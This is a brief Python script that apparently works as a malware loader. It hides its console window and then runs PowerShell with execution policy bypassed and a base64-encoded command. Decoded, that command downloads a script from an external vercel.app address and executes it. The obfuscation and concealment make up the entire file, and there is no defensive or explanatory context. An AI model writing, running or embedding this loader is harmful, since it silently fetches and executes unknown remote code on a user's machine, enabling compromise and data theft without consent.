import subprocess
import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
cmd = 'cmd.exe /k powershell -ExecutionPolicy Bypass -e aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA'
subprocess.Popen(cmd, shell=True)
